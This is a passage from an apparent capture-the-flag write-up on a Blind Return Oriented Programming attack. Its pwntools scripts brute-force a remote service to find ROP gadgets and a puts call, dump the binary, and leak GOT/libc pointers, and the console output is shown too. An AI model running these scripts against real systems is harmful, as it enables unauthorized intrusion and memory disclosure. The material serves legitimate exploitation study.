</pre></table></code></div></div><p>We got a lot of info from these fucntions. Let me go over them a little bit.</p><ul><li><p>So we see that at some offset, the function that takes our input gets callbacked again. So i manually went over the offsets and found which functions allows us to loopback to the start without crashing. I set the address to a variable <code class="language-plaintext highlighter-rouge">LOOPBACK_FUNC = BINARY_BASE + 0x5c0</code></p><li><p>We see that there is also a function which leaks <code class="language-plaintext highlighter-rouge">libc</code> address and also takes our input. This would’ve been much easier to use to exploit but I thought that this kinda seems unintentional.</p><li><p>There is also a troll function which when called prints out <code class="language-plaintext highlighter-rouge">Do not dump my memeory!</code></p></ul><p>At the end we update our global variables with -</p><div class="language-py highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">DUMP_FUNC</span> <span class="o">=</span> <span class="n">BINARY_BASE</span> <span class="o">+</span> <span class="mi">1806</span>
<span class="n">LOOPBACK_FUNC</span> <span class="o">=</span> <span class="n">BINARY_BASE</span> <span class="o">+</span> <span class="mh">0x5c0</span>
</pre></table></code></div></div><h2 id="brop">BROP</h2><hr /><p>We’ve done our reconnaissance, now we have to plan how to exploit this. We can use <code class="language-plaintext highlighter-rouge">Blind Return Oriented Programming</code> which is a technique we use when we have to <code class="language-plaintext highlighter-rouge">ROP</code> without the target binary.</p><p>These are the things we need to perform a <code class="language-plaintext highlighter-rouge">BROP</code> attack:</p><ul><li><p>A <code class="language-plaintext highlighter-rouge">stop gadget</code> or something that when called will either stop the execution or print something know to us. I decided to use the troll <code class="language-plaintext highlighter-rouge">DUMP_FUNC</code></p><li><p>Next step is to find the special <code class="language-plaintext highlighter-rouge">BROP</code> gadget that allows us to control <code class="language-plaintext highlighter-rouge">RDI</code> and can be spotted easily. I’ll go over this later.</p><li><p>Next we need to leak libc for that we’ll use the <code class="language-plaintext highlighter-rouge">plt</code> and <code class="language-plaintext highlighter-rouge">got</code> to our advantage.</p></ul><h2 id="the-special-brop-gadget">The Special BROP Gadget</h2><hr /><p>This <a href="https://kn0wledge.fr/write-ups/pwn-blind-date/#finding-a-brop-gadget">article</a> does a much better job at explaining about how this gadget works and how to find it. Basically, at some address it pops <code class="language-plaintext highlighter-rouge">6</code> values into registers and then returns and at another offset it only pops <code class="language-plaintext highlighter-rouge">2</code> values and returns and there is finally another offset it only pops into <code class="language-plaintext highlighter-rouge">RDI</code> and returns.</p><p>Heres the function that I used -</p><div class="language-py highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">FindBropGadget</span><span class="p">():</span>
    <span class="n">possible</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">BINARY_BASE</span><span class="p">,</span> <span class="n">BINARY_BASE</span><span class="o">+</span><span class="mh">0x1000</span><span class="p">):</span>
        <span class="n">pwn</span><span class="p">.</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Scanning: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s">'critical'</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="n">OFFSET</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>  <span class="c1"># Possible pop gadget
</span>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># pop rbx
</span>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># pop rbp
</span>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># pop r12
</span>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># pop r13
</span>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># pop r14
</span>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># pop r15
</span>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">DUMP_FUNC</span><span class="p">)</span>
        <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
        <span class="n">mssg</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.2</span><span class="p">)</span>
        <span class="k">if</span> <span class="sa">b</span><span class="s">'Do not dump'</span> <span class="ow">in</span> <span class="n">mssg</span><span class="p">:</span>
            <span class="n">pwn</span><span class="p">.</span><span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Found pop gadget at: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
            <span class="n">possible</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
        <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">possible</span>
</pre></table></code></div></div><p>This gave me a possible list of addresses that could contain this gadget</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">[</span>+] Found pop gadget at: 0x4007ba
<span class="o">[</span>+] Found pop gadget at: 0x40070e
</pre></table></code></div></div><p>To confirm the gadget, I added the offset to the address so that it pops less values than before and check which is correct.</p><div class="language-py highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">CheckBROP</span><span class="p">():</span>
    <span class="c1"># possible = [4196110, 4196282]
</span>    <span class="c1"># for i in possible:
</span>    <span class="c1">#     io = pwn.remote(HOST, PORT, level='critical')
</span>    <span class="c1">#     payload = b'A'*OFFSET
</span>    <span class="c1">#     payload += pwn.p64(i + 7)  # possilbe pop 2 gadget
</span>    <span class="c1">#     payload += pwn.p64(0)  # pop rsi
</span>    <span class="c1">#     payload += pwn.p64(0)  # pop r15
</span>    <span class="c1">#     payload += pwn.p64(DUMP_FUNC)
</span>    <span class="c1">#     io.send(payload)
</span>    <span class="c1">#     mssg = io.recv(0x1000, timeout=0.2)
</span>    <span class="c1">#     if b'Do not dump' in mssg:
</span>    <span class="c1">#         pwn.log.success("Found pop gadget at: " + hex(i))
</span>    <span class="c1">#     io.close()
</span>    <span class="n">possible</span> <span class="o">=</span> <span class="p">[</span><span class="mi">4196110</span><span class="p">,</span> <span class="mi">4196282</span><span class="p">]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">possible</span><span class="p">:</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s">'critical'</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="n">OFFSET</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">9</span><span class="p">)</span>  <span class="c1"># possilbe pop 2 gadget
</span>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># pop rdi
</span>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">DUMP_FUNC</span><span class="p">)</span>
        <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
        <span class="n">mssg</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.2</span><span class="p">)</span>
        <span class="k">if</span> <span class="sa">b</span><span class="s">'Do not dump'</span> <span class="ow">in</span> <span class="n">mssg</span><span class="p">:</span>
            <span class="n">pwn</span><span class="p">.</span><span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Found pop gadget at: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
        <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</pre></table></code></div></div><p>From this I got the correct address of the BROP gadget and I added it to the global variables.</p><div class="language-py highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">BROP_GADGET</span> <span class="o">=</span> <span class="mh">0x4007ba</span>
</pre></table></code></div></div><p>With this function we have control over <code class="language-plaintext highlighter-rouge">RDI</code> and we can use it to set arguments to functions.</p><h2 id="finding-puts">Finding PUTS</h2><hr /><p>Since we now have controll over <code class="language-plaintext highlighter-rouge">RDI</code> we can use it set the first argument to any functions. So what I did is I set <code class="language-plaintext highlighter-rouge">RDI</code> to the <code class="language-plaintext highlighter-rouge">BINARY_BASE</code> and tried to call <code class="language-plaintext highlighter-rouge">puts</code> or <code class="language-plaintext highlighter-rouge">printf</code> whatever is present in the binary. Since I did’nt know the address of the <code class="language-plaintext highlighter-rouge">leak fucntion</code> I bruteforced it so that if the correct fucntion is called, it would print out the bytes <code class="language-plaintext highlighter-rouge">b'ELF'</code> in its output as its part of the header of the ELF file.</p><p>Here is the function that I used -</p><div class="language-py highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">FindLeakFunc</span><span class="p">():</span>
    <span class="n">funcs</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">BINARY_BASE</span><span class="p">,</span> <span class="n">BINARY_BASE</span><span class="o">+</span><span class="mh">0x4000</span><span class="p">):</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s">'critical'</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="n">OFFSET</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">BROP_GADGET</span> <span class="o">+</span> <span class="mi">9</span><span class="p">)</span>  <span class="c1"># pop rdi
</span>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">BINARY_BASE</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
        <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
        <span class="n">mssg</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.2</span><span class="p">)</span>
        <span class="k">if</span> <span class="sa">b</span><span class="s">'ELF'</span> <span class="ow">in</span> <span class="n">mssg</span><span class="p">:</span>
            <span class="n">pwn</span><span class="p">.</span><span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Found leak func at: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
            <span class="n">funcs</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
        <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">funcs</span>
</pre></table></code></div></div><p>This is the output I got -</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="o">[</span>+] Found leak func at: 0x400550
<span class="o">[</span>+] Found leak func at: 0x400555
<span class="o">[</span>+] Found leak func at: 0x400557
<span class="o">[</span>+] Found leak func at: 0x40055c
<span class="o">[</span>+] Found leak func at: 0x40055e
<span class="o">[</span>+] Found leak func at: 0x40055f
<span class="o">[</span>+] Found leak func at: 0x400560
<span class="o">[</span>+] Found leak func at: 0x400561
<span class="o">[</span>+] Found leak func at: 0x40056b
<span class="o">[</span>+] Found leak func at: 0x40057b
<span class="o">[</span>+] Found leak func at: 0x40058b
<span class="o">[</span>+] Found leak func at: 0x40059b
<span class="o">[</span>+] Found leak func at: 0x4005ab
<span class="o">[</span>+] Found leak func at: 0x4006fb
<span class="o">[</span>+] Found leak func at: 0x400713
<span class="o">[</span>+] Found leak func at: 0x40071f
<span class="o">[</span>4195664, 4195669, 4195671, 4195676, 4195678, 4195679, 4195680, 4195681, 4195691, 4195707, 4195723, 4195739, 4195755, 4196091, 4196115, 4196127]
</pre></table></code></div></div><p>I chose a function from these later on that worked properly and added it to our global variables.</p><div class="language-py highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">CALL_PUTS</span> <span class="o">=</span> <span class="mh">0x400560</span>
</pre></table></code></div></div><h2 id="leaking-binary">Leaking Binary</h2><hr /><p>Now that we have the address of the <code class="language-plaintext highlighter-rouge">leak function</code> I though I could use this to leak the binary. Even though I leaked some parts of the binary, I must have done something wrong as a lot of data was missing from the resulting <code class="language-plaintext highlighter-rouge">ELF</code> file formed.</p><p>Heres the function I used anyway -</p><div class="language-py highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">LeakELF</span><span class="p">():</span>
    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'leak.elf'</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span>
    <span class="n">offset</span> <span class="o">=</span> <span class="n">BINARY_BASE</span>
    <span class="k">while</span><span class="p">(</span><span class="n">offset</span> <span class="o">&lt;</span> <span class="n">BINARY_BASE</span> <span class="o">+</span> <span class="mh">0x4000</span><span class="p">):</span>
        <span class="n">pwn</span><span class="p">.</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"At offset: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">offset</span><span class="p">))</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s">'critical'</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="n">OFFSET</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">BROP_GADGET</span> <span class="o">+</span> <span class="mi">9</span><span class="p">)</span>  <span class="c1"># pop rdi
</span>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">CALL_PUTS</span><span class="p">)</span>
        <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
        <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
        <span class="n">mssg</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvall</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
        <span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">pwn</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="n">mssg</span><span class="p">,</span> <span class="s">'all'</span><span class="p">)))</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">mssg</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>
            <span class="n">offset</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">mssg</span><span class="p">)</span>
            <span class="n">offset</span> <span class="o">+=</span> <span class="nb">len</span><span class="p">(</span><span class="n">mssg</span><span class="p">)</span>
        <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
        <span class="n">f</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>
</pre></table></code></div></div><h2 id="leaking-plt">Leaking PLT</h2><hr /><p>We have the <code class="language-plaintext highlighter-rouge">leak function</code> and I know that usually the <code class="language-plaintext highlighter-rouge">plt</code> section is somewhere after address <code class="language-plaintext highlighter-rouge">0x600000</code> so I kept on scanning 8 bytes at a time until I found any data that had the bytes <code class="language-plaintext highlighter-rouge">b'\x7f'</code> in them and printed the data in them.</p><p>Here is the function I used -</p><div class="language-py highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">LeakPLT</span><span class="p">():</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x600000</span><span class="p">,</span> <span class="mh">0x600000</span><span class="o">+</span><span class="mh">0x4000</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s">'critical'</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="n">OFFSET</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">BROP_GADGET</span> <span class="o">+</span> <span class="mi">9</span><span class="p">)</span>  <span class="c1"># pop rdi
</span>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">CALL_PUTS</span><span class="p">)</span>
        <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
        <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
        <span class="n">mssg</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvall</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
        <span class="k">if</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x7f</span><span class="s">'</span> <span class="ow">in</span> <span class="n">mssg</span><span class="p">:</span>
            <span class="n">pwn</span><span class="p">.</span><span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Found Possible GOT at: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
            <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
        <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</pre></table></code></div></div><p>The output I got is -</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="o">[</span>+] Found Possible GOT at: 0x600000
<span class="o">[</span>+] Found Possible GOT at: 0x600288
<span class="o">[</span>+] Found Possible GOT at: 0x600ef0
<span class="o">[</span>+] Found Possible GOT at: 0x601010
<span class="o">[</span>+] Found Possible GOT at: 0x601018
<span class="o">[</span>+] Found Possible GOT at: 0x601020
<span class="o">[</span>+] Found Possible GOT at: 0x601028
<span class="o">[</span>+] Found Possible GOT at: 0x601030
<span class="o">[</span>+] Found Possible GOT at: 0x601038
<span class="o">[</span>+] Found Possible GOT at: 0x601070
<span class="o">[</span>+] Found Possible GOT at: 0x601080
</pre></table></code></div></div><p>I then scaned a <code class="language-plaintext highlighter-rouge">QWORD</code> at these address using this function -</p><div class="language-py highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">scanQWORD</span><span class="p">(</span><span class="n">l</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s">'critical'</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="n">OFFSET</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">BROP_GADGET</span> <span class="o">+</span> <span class="mi">9</span><span class="p">)</span>  <span class="c1"># pop rdi
</span>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">CALL_PUTS</span><span class="p">)</span>
        <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
        <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
        <span class="n">mssg</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvall</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
        <span class="n">mssg</span> <span class="o">=</span> <span class="n">mssg</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">8</span><span class="p">]</span>
        <span class="n">mssg</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="n">mssg</span><span class="p">,</span> <span class="s">'all'</span><span class="p">)</span>
        <span class="n">pwn</span><span class="p">.</span><span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"QWORD @ Memory -"</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">+</span> <span class="s">": "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">mssg</span><span class="p">))</span>
        <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</pre></table></code></div></div><p>Here is the output I got -</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="o">[</span>+] QWORD @ Memory <span class="nt">-0x600000</span>: 0x10102464c457f
<span class="o">[</span>+] QWORD @ Memory <span class="nt">-0x600288</span>: 0x6afe6e7f0281de17
<span class="o">[</span>+] QWORD @ Memory <span class="nt">-0x600ef0</span>: 0x7fab15e99140
<span class="o">[</span>+] QWORD @ Memory <span class="nt">-0x601010</span>: 0x7fddce633e40
<span class="o">[</span>+] QWORD @ Memory <span class="nt">-0x601018</span>: 0x7f1ed97a46a0
<span class="o">[</span>+] QWORD @ Memory <span class="nt">-0x601020</span>: 0x7f2bc6a7f6c0
<span class="o">[</span>+] QWORD @ Memory <span class="nt">-0x601028</span>: 0x7f1a2e6f9350
<span class="o">[</span>+] QWORD @ Memory <span class="nt">-0x601030</span>: 0x7f5146e88750
<span class="o">[</span>+] QWORD @ Memory <span class="nt">-0x601038</span>: 0x7ff3b3dbd5f0
<span class="o">[</span>+] QWORD @ Memory <span class="nt">-0x601070</span>: 0x7f3e1882f8e0
<span class="o">[</span>+] QWORD @ Memory <span class="nt">-0x601080</span>: 0x7f8d592fb540
